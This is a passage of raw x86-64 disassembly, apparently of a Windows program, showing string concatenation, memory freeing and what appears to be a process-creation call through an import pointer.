   2dc492519:	4c 89 e1             	mov    %r12,%rcx
   2dc49251c:	4c 8d 04 43          	lea    (%rbx,%rax,2),%r8
   2dc492520:	e8 5b f2 ff ff       	call   0x2dc491780
   2dc492525:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   2dc49252a:	4c 8d 05 77 5c 02 00 	lea    0x25c77(%rip),%r8        # 0x2dc4b81a8
   2dc492531:	4c 89 e2             	mov    %r12,%rdx
   2dc492534:	e8 67 f3 ff ff       	call   0x2dc4918a0
   2dc492539:	48 8b 84 24 00 03 00 	mov    0x300(%rsp),%rax
   2dc492540:	00 
   2dc492541:	48 8b 8c 24 70 01 00 	mov    0x170(%rsp),%rcx
   2dc492548:	00 
   2dc492549:	4c 8b 84 24 08 03 00 	mov    0x308(%rsp),%r8
   2dc492550:	00 
   2dc492551:	48 39 e8             	cmp    %rbp,%rax
   2dc492554:	0f 84 d2 0d 00 00    	je     0x2dc49332c
   2dc49255a:	66 49 0f 6e c0       	movq   %r8,%xmm0
   2dc49255f:	48 8d 94 24 80 01 00 	lea    0x180(%rsp),%rdx
   2dc492566:	00 
   2dc492567:	0f 16 84 24 10 03 00 	movhps 0x310(%rsp),%xmm0
   2dc49256e:	00 
   2dc49256f:	48 39 d1             	cmp    %rdx,%rcx
   2dc492572:	0f 84 e8 0e 00 00    	je     0x2dc493460
   2dc492578:	48 8b 94 24 80 01 00 	mov    0x180(%rsp),%rdx
   2dc49257f:	00 
   2dc492580:	48 89 84 24 70 01 00 	mov    %rax,0x170(%rsp)
   2dc492587:	00 
   2dc492588:	0f 11 84 24 78 01 00 	movups %xmm0,0x178(%rsp)
   2dc49258f:	00 
   2dc492590:	48 85 c9             	test   %rcx,%rcx
   2dc492593:	74 3a                	je     0x2dc4925cf
   2dc492595:	48 89 8c 24 00 03 00 	mov    %rcx,0x300(%rsp)
   2dc49259c:	00 
   2dc49259d:	48 89 94 24 10 03 00 	mov    %rdx,0x310(%rsp)
   2dc4925a4:	00 
   2dc4925a5:	48 c7 84 24 08 03 00 	movq   $0x0,0x308(%rsp)
   2dc4925ac:	00 00 00 00 00 
   2dc4925b1:	45 31 c9             	xor    %r9d,%r9d
   2dc4925b4:	66 44 89 09          	mov    %r9w,(%rcx)
   2dc4925b8:	48 39 e9             	cmp    %rbp,%rcx
   2dc4925bb:	74 12                	je     0x2dc4925cf
   2dc4925bd:	48 8b 84 24 10 03 00 	mov    0x310(%rsp),%rax
   2dc4925c4:	00 
   2dc4925c5:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc4925ca:	e8 b1 36 02 00       	call   0x2dc4b5c80
   2dc4925cf:	48 8b 8c 24 90 02 00 	mov    0x290(%rsp),%rcx
   2dc4925d6:	00 
   2dc4925d7:	48 39 f1             	cmp    %rsi,%rcx
   2dc4925da:	74 12                	je     0x2dc4925ee
   2dc4925dc:	48 8b 84 24 a0 02 00 	mov    0x2a0(%rsp),%rax
   2dc4925e3:	00 
   2dc4925e4:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc4925e9:	e8 92 36 02 00       	call   0x2dc4b5c80
   2dc4925ee:	48 8b 8c 24 70 01 00 	mov    0x170(%rsp),%rcx
   2dc4925f5:	00 
   2dc4925f6:	48 85 c9             	test   %rcx,%rcx
   2dc4925f9:	0f 84 d6 0c 00 00    	je     0x2dc4932d5
   2dc4925ff:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   2dc492604:	ff d0                	call   *%rax
   2dc492606:	83 f8 ff             	cmp    $0xffffffff,%eax
   2dc492609:	0f 84 ad 0c 00 00    	je     0x2dc4932bc
   2dc49260f:	a8 10                	test   $0x10,%al
   2dc492611:	0f 85 a5 0c 00 00    	jne    0x2dc4932bc
   2dc492617:	48 8d 84 24 20 02 00 	lea    0x220(%rsp),%rax
   2dc49261e:	00 
   2dc49261f:	48 8d 9c 24 10 02 00 	lea    0x210(%rsp),%rbx
   2dc492626:	00 
   2dc492627:	48 8d 0d 38 5b 02 00 	lea    0x25b38(%rip),%rcx        # 0x2dc4b8166
   2dc49262e:	48 8d 3d 31 5b 02 00 	lea    0x25b31(%rip),%rdi        # 0x2dc4b8166
   2dc492635:	48 89 9c 24 c8 00 00 	mov    %rbx,0xc8(%rsp)
   2dc49263c:	00 
   2dc49263d:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
   2dc492644:	00 
   2dc492645:	48 89 84 24 10 02 00 	mov    %rax,0x210(%rsp)
   2dc49264c:	00 
   2dc49264d:	e8 a6 26 01 00       	call   0x2dc4a4cf8
   2dc492652:	48 89 fa             	mov    %rdi,%rdx
   2dc492655:	48 89 d9             	mov    %rbx,%rcx
   2dc492658:	4c 8d 04 47          	lea    (%rdi,%rax,2),%r8
   2dc49265c:	e8 1f f1 ff ff       	call   0x2dc491780
   2dc492661:	48 8d 0d 5e 5b 02 00 	lea    0x25b5e(%rip),%rcx        # 0x2dc4b81c6
   2dc492668:	e8 8b 26 01 00       	call   0x2dc4a4cf8
   2dc49266d:	48 8b bc 24 78 01 00 	mov    0x178(%rsp),%rdi
   2dc492674:	00 
   2dc492675:	45 31 c0             	xor    %r8d,%r8d
   2dc492678:	48 8d 8c 24 f0 01 00 	lea    0x1f0(%rsp),%rcx
   2dc49267f:	00 
   2dc492680:	48 89 c3             	mov    %rax,%rbx
   2dc492683:	48 8d 84 24 00 02 00 	lea    0x200(%rsp),%rax
   2dc49268a:	00 
   2dc49268b:	48 89 8c 24 88 00 00 	mov    %rcx,0x88(%rsp)
   2dc492692:	00 
   2dc492693:	4c 8b ac 24 70 01 00 	mov    0x170(%rsp),%r13
   2dc49269a:	00 
   2dc49269b:	48 8d 14 3b          	lea    (%rbx,%rdi,1),%rdx
   2dc49269f:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   2dc4926a6:	00 
   2dc4926a7:	48 89 84 24 f0 01 00 	mov    %rax,0x1f0(%rsp)
   2dc4926ae:	00 
   2dc4926af:	48 c7 84 24 f8 01 00 	movq   $0x0,0x1f8(%rsp)
   2dc4926b6:	00 00 00 00 00 
   2dc4926bb:	66 44 89 84 24 00 02 	mov    %r8w,0x200(%rsp)
   2dc4926c2:	00 00 
   2dc4926c4:	e8 97 0f 02 00       	call   0x2dc4b3660
   2dc4926c9:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc4926d0:	ff ff 1f 
   2dc4926d3:	48 2b 84 24 f8 01 00 	sub    0x1f8(%rsp),%rax
   2dc4926da:	00 
   2dc4926db:	48 39 f8             	cmp    %rdi,%rax
   2dc4926de:	0f 82 1e 0f 00 00    	jb     0x2dc493602
   2dc4926e4:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   2dc4926eb:	00 
   2dc4926ec:	49 89 f8             	mov    %rdi,%r8
   2dc4926ef:	4c 89 ea             	mov    %r13,%rdx
   2dc4926f2:	e8 a9 10 02 00       	call   0x2dc4b37a0
   2dc4926f7:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc4926fe:	ff ff 1f 
   2dc492701:	48 2b 84 24 f8 01 00 	sub    0x1f8(%rsp),%rax
   2dc492708:	00 
   2dc492709:	48 39 d8             	cmp    %rbx,%rax
   2dc49270c:	0f 82 e4 0e 00 00    	jb     0x2dc4935f6
   2dc492712:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   2dc492719:	00 
   2dc49271a:	49 89 d8             	mov    %rbx,%r8
   2dc49271d:	48 8d 15 a2 5a 02 00 	lea    0x25aa2(%rip),%rdx        # 0x2dc4b81c6
   2dc492724:	e8 77 10 02 00       	call   0x2dc4b37a0
   2dc492729:	48 8b 94 24 f8 01 00 	mov    0x1f8(%rsp),%rdx
   2dc492730:	00 
   2dc492731:	4c 8b 84 24 18 02 00 	mov    0x218(%rsp),%r8
   2dc492738:	00 
   2dc492739:	4c 8b 8c 24 f0 01 00 	mov    0x1f0(%rsp),%r9
   2dc492740:	00 
   2dc492741:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   2dc492748:	00 
   2dc492749:	48 8b 8c 24 10 02 00 	mov    0x210(%rsp),%rcx
   2dc492750:	00 
   2dc492751:	4a 8d 04 02          	lea    (%rdx,%r8,1),%rax
   2dc492755:	49 39 d9             	cmp    %rbx,%r9
   2dc492758:	0f 84 37 0c 00 00    	je     0x2dc493395
   2dc49275e:	48 39 84 24 00 02 00 	cmp    %rax,0x200(%rsp)
   2dc492765:	00 
   2dc492766:	73 22                	jae    0x2dc49278a
   2dc492768:	48 8b 9c 24 98 00 00 	mov    0x98(%rsp),%rbx
   2dc49276f:	00 
   2dc492770:	48 39 d9             	cmp    %rbx,%rcx
   2dc492773:	0f 84 fc 0c 00 00    	je     0x2dc493475
   2dc492779:	4c 8b 94 24 20 02 00 	mov    0x220(%rsp),%r10
   2dc492780:	00 
   2dc492781:	49 39 c2             	cmp    %rax,%r10
   2dc492784:	0f 83 86 0b 00 00    	jae    0x2dc493310
   2dc49278a:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc492791:	ff ff 1f 
   2dc492794:	48 29 d0             	sub    %rdx,%rax
   2dc492797:	4c 39 c0             	cmp    %r8,%rax
   2dc49279a:	0f 82 86 0e 00 00    	jb     0x2dc493626
   2dc4927a0:	48 89 ca             	mov    %rcx,%rdx
   2dc4927a3:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   2dc4927aa:	00 
   2dc4927ab:	e8 f0 0f 02 00       	call   0x2dc4b37a0
   2dc4927b0:	48 89 c3             	mov    %rax,%rbx
   2dc4927b3:	48 8d 84 24 40 02 00 	lea    0x240(%rsp),%rax
   2dc4927ba:	00 
   2dc4927bb:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
   2dc4927c2:	00 
   2dc4927c3:	48 8d 7b 10          	lea    0x10(%rbx),%rdi
   2dc4927c7:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   2dc4927cb:	48 89 84 24 30 02 00 	mov    %rax,0x230(%rsp)
   2dc4927d2:	00 
   2dc4927d3:	48 8b 03             	mov    (%rbx),%rax
   2dc4927d6:	48 39 f8             	cmp    %rdi,%rax
   2dc4927d9:	0f 84 98 0b 00 00    	je     0x2dc493377
   2dc4927df:	48 89 84 24 30 02 00 	mov    %rax,0x230(%rsp)
   2dc4927e6:	00 
   2dc4927e7:	48 8b 43 10          	mov    0x10(%rbx),%rax
   2dc4927eb:	48 89 84 24 40 02 00 	mov    %rax,0x240(%rsp)
   2dc4927f2:	00 
   2dc4927f3:	48 89 94 24 38 02 00 	mov    %rdx,0x238(%rsp)
   2dc4927fa:	00 
   2dc4927fb:	31 d2                	xor    %edx,%edx
   2dc4927fd:	48 89 3b             	mov    %rdi,(%rbx)
   2dc492800:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   2dc492807:	00 
   2dc492808:	66 89 53 10          	mov    %dx,0x10(%rbx)
   2dc49280c:	48 8d 1d cd 59 02 00 	lea    0x259cd(%rip),%rbx        # 0x2dc4b81e0
   2dc492813:	48 89 d9             	mov    %rbx,%rcx
   2dc492816:	e8 dd 24 01 00       	call   0x2dc4a4cf8
   2dc49281b:	49 89 c0             	mov    %rax,%r8
   2dc49281e:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc492825:	ff ff 1f 
   2dc492828:	48 2b 84 24 38 02 00 	sub    0x238(%rsp),%rax
   2dc49282f:	00 
   2dc492830:	4c 39 c0             	cmp    %r8,%rax
   2dc492833:	48 8d 84 24 30 02 00 	lea    0x230(%rsp),%rax
   2dc49283a:	00 
   2dc49283b:	48 89 84 24 d0 00 00 	mov    %rax,0xd0(%rsp)
   2dc492842:	00 
   2dc492843:	0f 82 a1 0d 00 00    	jb     0x2dc4935ea
   2dc492849:	48 89 da             	mov    %rbx,%rdx
   2dc49284c:	48 89 c1             	mov    %rax,%rcx
   2dc49284f:	e8 4c 0f 02 00       	call   0x2dc4b37a0
   2dc492854:	48 89 c7             	mov    %rax,%rdi
   2dc492857:	48 8d 84 24 60 02 00 	lea    0x260(%rsp),%rax
   2dc49285e:	00 
   2dc49285f:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   2dc492864:	4c 8d 6f 10          	lea    0x10(%rdi),%r13
   2dc492868:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   2dc49286c:	48 89 84 24 50 02 00 	mov    %rax,0x250(%rsp)
   2dc492873:	00 
   2dc492874:	48 8b 07             	mov    (%rdi),%rax
   2dc492877:	4c 39 e8             	cmp    %r13,%rax
   2dc49287a:	0f 84 c5 0b 00 00    	je     0x2dc493445
   2dc492880:	48 89 84 24 50 02 00 	mov    %rax,0x250(%rsp)
   2dc492887:	00 
   2dc492888:	48 8b 47 10          	mov    0x10(%rdi),%rax
   2dc49288c:	48 89 84 24 60 02 00 	mov    %rax,0x260(%rsp)
   2dc492893:	00 
   2dc492894:	48 89 94 24 58 02 00 	mov    %rdx,0x258(%rsp)
   2dc49289b:	00 
   2dc49289c:	31 c0                	xor    %eax,%eax
   2dc49289e:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   2dc4928a5:	00 
   2dc4928a6:	4c 8b 84 24 58 01 00 	mov    0x158(%rsp),%r8
   2dc4928ad:	00 
   2dc4928ae:	66 89 47 10          	mov    %ax,0x10(%rdi)
   2dc4928b2:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc4928b9:	ff ff 1f 
   2dc4928bc:	48 2b 84 24 58 02 00 	sub    0x258(%rsp),%rax
   2dc4928c3:	00 
   2dc4928c4:	4c 39 c0             	cmp    %r8,%rax
   2dc4928c7:	48 8d 84 24 50 02 00 	lea    0x250(%rsp),%rax
   2dc4928ce:	00 
   2dc4928cf:	4c 89 2f             	mov    %r13,(%rdi)
   2dc4928d2:	48 8b 94 24 50 01 00 	mov    0x150(%rsp),%rdx
   2dc4928d9:	00 
   2dc4928da:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   2dc4928df:	0f 82 59 0d 00 00    	jb     0x2dc49363e
   2dc4928e5:	48 89 c1             	mov    %rax,%rcx
   2dc4928e8:	e8 b3 0e 02 00       	call   0x2dc4b37a0
   2dc4928ed:	4c 8d b4 24 80 02 00 	lea    0x280(%rsp),%r14
   2dc4928f4:	00 
   2dc4928f5:	48 89 c7             	mov    %rax,%rdi
   2dc4928f8:	4c 89 b4 24 70 02 00 	mov    %r14,0x270(%rsp)
   2dc4928ff:	00 
   2dc492900:	48 8b 00             	mov    (%rax),%rax
   2dc492903:	4c 8d 6f 10          	lea    0x10(%rdi),%r13
   2dc492907:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   2dc49290b:	4c 39 e8             	cmp    %r13,%rax
   2dc49290e:	0f 84 18 0b 00 00    	je     0x2dc49342c
   2dc492914:	48 89 84 24 70 02 00 	mov    %rax,0x270(%rsp)
   2dc49291b:	00 
   2dc49291c:	48 8b 47 10          	mov    0x10(%rdi),%rax
   2dc492920:	48 89 84 24 80 02 00 	mov    %rax,0x280(%rsp)
   2dc492927:	00 
   2dc492928:	31 c0                	xor    %eax,%eax
   2dc49292a:	48 89 94 24 78 02 00 	mov    %rdx,0x278(%rsp)
   2dc492931:	00 
   2dc492932:	48 89 d9             	mov    %rbx,%rcx
   2dc492935:	4c 89 2f             	mov    %r13,(%rdi)
   2dc492938:	4c 8d ac 24 70 02 00 	lea    0x270(%rsp),%r13
   2dc49293f:	00 
   2dc492940:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   2dc492947:	00 
   2dc492948:	66 89 47 10          	mov    %ax,0x10(%rdi)
   2dc49294c:	e8 a7 23 01 00       	call   0x2dc4a4cf8
   2dc492951:	49 89 c0             	mov    %rax,%r8
   2dc492954:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc49295b:	ff ff 1f 
   2dc49295e:	48 2b 84 24 78 02 00 	sub    0x278(%rsp),%rax
   2dc492965:	00 
   2dc492966:	4c 39 c0             	cmp    %r8,%rax
   2dc492969:	0f 82 c3 0c 00 00    	jb     0x2dc493632
   2dc49296f:	48 89 da             	mov    %rbx,%rdx
   2dc492972:	4c 89 e9             	mov    %r13,%rcx
   2dc492975:	e8 26 0e 02 00       	call   0x2dc4b37a0
   2dc49297a:	48 89 c7             	mov    %rax,%rdi
   2dc49297d:	48 89 b4 24 90 02 00 	mov    %rsi,0x290(%rsp)
   2dc492984:	00 
   2dc492985:	48 8b 00             	mov    (%rax),%rax
   2dc492988:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   2dc49298c:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   2dc492990:	48 39 d0             	cmp    %rdx,%rax
   2dc492993:	0f 84 6d 0a 00 00    	je     0x2dc493406
   2dc492999:	48 89 84 24 90 02 00 	mov    %rax,0x290(%rsp)
   2dc4929a0:	00 
   2dc4929a1:	48 8b 47 10          	mov    0x10(%rdi),%rax
   2dc4929a5:	48 89 84 24 a0 02 00 	mov    %rax,0x2a0(%rsp)
   2dc4929ac:	00 
   2dc4929ad:	48 89 8c 24 98 02 00 	mov    %rcx,0x298(%rsp)
   2dc4929b4:	00 
   2dc4929b5:	31 c0                	xor    %eax,%eax
   2dc4929b7:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   2dc4929be:	00 
   2dc4929bf:	4c 8b 84 24 38 01 00 	mov    0x138(%rsp),%r8
   2dc4929c6:	00 
   2dc4929c7:	66 89 47 10          	mov    %ax,0x10(%rdi)
   2dc4929cb:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc4929d2:	ff ff 1f 
   2dc4929d5:	48 2b 84 24 98 02 00 	sub    0x298(%rsp),%rax
   2dc4929dc:	00 
   2dc4929dd:	48 89 17             	mov    %rdx,(%rdi)
   2dc4929e0:	48 8b 94 24 30 01 00 	mov    0x130(%rsp),%rdx
   2dc4929e7:	00 
   2dc4929e8:	4c 39 c0             	cmp    %r8,%rax
   2dc4929eb:	0f 82 29 0c 00 00    	jb     0x2dc49361a
   2dc4929f1:	4c 89 e1             	mov    %r12,%rcx
   2dc4929f4:	e8 a7 0d 02 00       	call   0x2dc4b37a0
   2dc4929f9:	48 89 c7             	mov    %rax,%rdi
   2dc4929fc:	48 89 ac 24 00 03 00 	mov    %rbp,0x300(%rsp)
   2dc492a03:	00 
   2dc492a04:	48 8b 00             	mov    (%rax),%rax
   2dc492a07:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   2dc492a0b:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   2dc492a0f:	48 39 d0             	cmp    %rdx,%rax
   2dc492a12:	0f 84 c8 09 00 00    	je     0x2dc4933e0
   2dc492a18:	48 89 84 24 00 03 00 	mov    %rax,0x300(%rsp)
   2dc492a1f:	00 
   2dc492a20:	48 8b 47 10          	mov    0x10(%rdi),%rax
   2dc492a24:	48 89 84 24 10 03 00 	mov    %rax,0x310(%rsp)
   2dc492a2b:	00 
   2dc492a2c:	31 c0                	xor    %eax,%eax
   2dc492a2e:	48 89 8c 24 08 03 00 	mov    %rcx,0x308(%rsp)
   2dc492a35:	00 
   2dc492a36:	48 8d 0d 25 57 02 00 	lea    0x25725(%rip),%rcx        # 0x2dc4b8162
   2dc492a3d:	48 89 17             	mov    %rdx,(%rdi)
   2dc492a40:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   2dc492a47:	00 
   2dc492a48:	66 89 47 10          	mov    %ax,0x10(%rdi)
   2dc492a4c:	e8 a7 22 01 00       	call   0x2dc4a4cf8
   2dc492a51:	49 89 c0             	mov    %rax,%r8
   2dc492a54:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc492a5b:	ff ff 1f 
   2dc492a5e:	48 2b 84 24 08 03 00 	sub    0x308(%rsp),%rax
   2dc492a65:	00 
   2dc492a66:	4c 39 c0             	cmp    %r8,%rax
   2dc492a69:	0f 82 9f 0b 00 00    	jb     0x2dc49360e
   2dc492a6f:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   2dc492a74:	48 8d 15 e7 56 02 00 	lea    0x256e7(%rip),%rdx        # 0x2dc4b8162
   2dc492a7b:	e8 20 0d 02 00       	call   0x2dc4b37a0
   2dc492a80:	48 89 c7             	mov    %rax,%rdi
   2dc492a83:	48 8d 84 24 a0 01 00 	lea    0x1a0(%rsp),%rax
   2dc492a8a:	00 
   2dc492a8b:	48 89 84 24 b8 00 00 	mov    %rax,0xb8(%rsp)
   2dc492a92:	00 
   2dc492a93:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   2dc492a97:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   2dc492a9b:	48 89 84 24 90 01 00 	mov    %rax,0x190(%rsp)
   2dc492aa2:	00 
   2dc492aa3:	48 8b 07             	mov    (%rdi),%rax
   2dc492aa6:	48 39 d0             	cmp    %rdx,%rax
   2dc492aa9:	0f 84 06 09 00 00    	je     0x2dc4933b5
   2dc492aaf:	48 89 84 24 90 01 00 	mov    %rax,0x190(%rsp)
   2dc492ab6:	00 
   2dc492ab7:	48 8b 47 10          	mov    0x10(%rdi),%rax
   2dc492abb:	48 89 84 24 a0 01 00 	mov    %rax,0x1a0(%rsp)
   2dc492ac2:	00 
   2dc492ac3:	48 89 8c 24 98 01 00 	mov    %rcx,0x198(%rsp)
   2dc492aca:	00 
   2dc492acb:	31 c0                	xor    %eax,%eax
   2dc492acd:	48 89 17             	mov    %rdx,(%rdi)
   2dc492ad0:	48 8b 8c 24 00 03 00 	mov    0x300(%rsp),%rcx
   2dc492ad7:	00 
   2dc492ad8:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   2dc492adf:	00 
   2dc492ae0:	66 89 47 10          	mov    %ax,0x10(%rdi)
   2dc492ae4:	48 39 e9             	cmp    %rbp,%rcx
   2dc492ae7:	74 12                	je     0x2dc492afb
   2dc492ae9:	48 8b 84 24 10 03 00 	mov    0x310(%rsp),%rax
   2dc492af0:	00 
   2dc492af1:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc492af6:	e8 85 31 02 00       	call   0x2dc4b5c80
   2dc492afb:	48 8b 8c 24 90 02 00 	mov    0x290(%rsp),%rcx
   2dc492b02:	00 
   2dc492b03:	48 39 f1             	cmp    %rsi,%rcx
   2dc492b06:	74 12                	je     0x2dc492b1a
   2dc492b08:	48 8b 84 24 a0 02 00 	mov    0x2a0(%rsp),%rax
   2dc492b0f:	00 
   2dc492b10:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc492b15:	e8 66 31 02 00       	call   0x2dc4b5c80
   2dc492b1a:	48 8b 8c 24 70 02 00 	mov    0x270(%rsp),%rcx
   2dc492b21:	00 
   2dc492b22:	4c 39 f1             	cmp    %r14,%rcx
   2dc492b25:	74 12                	je     0x2dc492b39
   2dc492b27:	48 8b 84 24 80 02 00 	mov    0x280(%rsp),%rax
   2dc492b2e:	00 
   2dc492b2f:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc492b34:	e8 47 31 02 00       	call   0x2dc4b5c80
   2dc492b39:	48 8b 8c 24 50 02 00 	mov    0x250(%rsp),%rcx
   2dc492b40:	00 
   2dc492b41:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   2dc492b46:	48 39 c1             	cmp    %rax,%rcx
   2dc492b49:	74 12                	je     0x2dc492b5d
   2dc492b4b:	48 8b 84 24 60 02 00 	mov    0x260(%rsp),%rax
   2dc492b52:	00 
   2dc492b53:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc492b58:	e8 23 31 02 00       	call   0x2dc4b5c80
   2dc492b5d:	48 8b 8c 24 30 02 00 	mov    0x230(%rsp),%rcx
   2dc492b64:	00 
   2dc492b65:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   2dc492b6c:	00 
   2dc492b6d:	48 39 c1             	cmp    %rax,%rcx
   2dc492b70:	74 12                	je     0x2dc492b84
   2dc492b72:	48 8b 84 24 40 02 00 	mov    0x240(%rsp),%rax
   2dc492b79:	00 
   2dc492b7a:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc492b7f:	e8 fc 30 02 00       	call   0x2dc4b5c80
   2dc492b84:	48 8b 8c 24 f0 01 00 	mov    0x1f0(%rsp),%rcx
   2dc492b8b:	00 
   2dc492b8c:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   2dc492b93:	00 
   2dc492b94:	48 39 c1             	cmp    %rax,%rcx
   2dc492b97:	74 12                	je     0x2dc492bab
   2dc492b99:	48 8b 84 24 00 02 00 	mov    0x200(%rsp),%rax
   2dc492ba0:	00 
   2dc492ba1:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc492ba6:	e8 d5 30 02 00       	call   0x2dc4b5c80
   2dc492bab:	48 8b 8c 24 10 02 00 	mov    0x210(%rsp),%rcx
   2dc492bb2:	00 
   2dc492bb3:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   2dc492bba:	00 
   2dc492bbb:	48 39 c1             	cmp    %rax,%rcx
   2dc492bbe:	74 12                	je     0x2dc492bd2
   2dc492bc0:	48 8b 84 24 20 02 00 	mov    0x220(%rsp),%rax
   2dc492bc7:	00 
   2dc492bc8:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc492bcd:	e8 ae 30 02 00       	call   0x2dc4b5c80
   2dc492bd2:	31 c0                	xor    %eax,%eax
   2dc492bd4:	66 0f ef c0          	pxor   %xmm0,%xmm0
   2dc492bd8:	48 8d bc 24 98 02 00 	lea    0x298(%rsp),%rdi
   2dc492bdf:	00 
   2dc492be0:	b9 0c 00 00 00       	mov    $0xc,%ecx
   2dc492be5:	48 c7 84 24 94 02 00 	movq   $0x0,0x294(%rsp)
   2dc492bec:	00 00 00 00 00 
   2dc492bf1:	48 c7 84 24 f0 02 00 	movq   $0x0,0x2f0(%rsp)
   2dc492bf8:	00 00 00 00 00 
   2dc492bfd:	f3 48 ab             	rep stos %rax,(%rdi)
   2dc492c00:	48 8b 84 24 98 01 00 	mov    0x198(%rsp),%rax
   2dc492c07:	00 
   2dc492c08:	c7 84 24 90 02 00 00 	movl   $0x68,0x290(%rsp)
   2dc492c0f:	68 00 00 00 
   2dc492c13:	48 c7 84 24 00 01 00 	movq   $0x0,0x100(%rsp)
   2dc492c1a:	00 00 00 00 00 
   2dc492c1f:	48 8d 48 01          	lea    0x1(%rax),%rcx
   2dc492c23:	0f 29 84 24 f0 00 00 	movaps %xmm0,0xf0(%rsp)
   2dc492c2a:	00 
   2dc492c2b:	48 b8 fc ff ff ff ff 	movabs $0x3ffffffffffffffc,%rax
   2dc492c32:	ff ff 3f 
   2dc492c35:	48 39 c8             	cmp    %rcx,%rax
   2dc492c38:	0f 82 5b 36 02 00    	jb     0x2dc4b6299
   2dc492c3e:	48 01 c9             	add    %rcx,%rcx
   2dc492c41:	e8 4a 30 02 00       	call   0x2dc4b5c90
   2dc492c46:	48 8b 94 24 90 01 00 	mov    0x190(%rsp),%rdx
   2dc492c4d:	00 
   2dc492c4e:	48 89 c1             	mov    %rax,%rcx
   2dc492c51:	48 89 c6             	mov    %rax,%rsi
   2dc492c54:	e8 97 20 01 00       	call   0x2dc4a4cf0
   2dc492c59:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   2dc492c5e:	45 31 c9             	xor    %r9d,%r9d
   2dc492c61:	45 31 c0             	xor    %r8d,%r8d
   2dc492c64:	48 8d 84 24 f0 00 00 	lea    0xf0(%rsp),%rax
   2dc492c6b:	00 
   2dc492c6c:	48 89 f2             	mov    %rsi,%rdx
   2dc492c6f:	31 c9                	xor    %ecx,%ecx
   2dc492c71:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   2dc492c78:	00 00 
   2dc492c7a:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   2dc492c7f:	48 8b 84 24 30 01 00 	mov    0x130(%rsp),%rax
   2dc492c86:	00 
   2dc492c87:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   2dc492c8e:	00 
   2dc492c8f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   2dc492c94:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   2dc492c9b:	00 
   2dc492c9c:	ff 15 56 38 03 00    	call   *0x33856(%rip)        # 0x2dc4c64f8
   2dc492ca2:	89 c7                	mov    %eax,%edi
   2dc492ca4:	48 89 f1             	mov    %rsi,%rcx
   2dc492ca7:	e8 b4 2f 02 00       	call   0x2dc4b5c60
   2dc492cac:	85 ff                	test   %edi,%edi
   2dc492cae:	0f 85 4c 06 00 00    	jne    0x2dc493300
   2dc492cb4:	31 c0                	xor    %eax,%eax
   2dc492cb6:	48 8d bc 24 08 03 00 	lea    0x308(%rsp),%rdi
   2dc492cbd:	00 
   2dc492cbe:	b9 0d 00 00 00       	mov    $0xd,%ecx
   2dc492cc3:	f3 48 ab             	rep stos %rax,(%rdi)
   2dc492cc6:	48 8b 05 3b 55 02 00 	mov    0x2553b(%rip),%rax        # 0x2dc4b8208
   2dc492ccd:	48 8d 0d 92 54 02 00 	lea    0x25492(%rip),%rcx        # 0x2dc4b8166
   2dc492cd4:	48 8d bc 24 c0 01 00 	lea    0x1c0(%rsp),%rdi
   2dc492cdb:	00 
   2dc492cdc:	48 8d 35 83 54 02 00 	lea    0x25483(%rip),%rsi        # 0x2dc4b8166
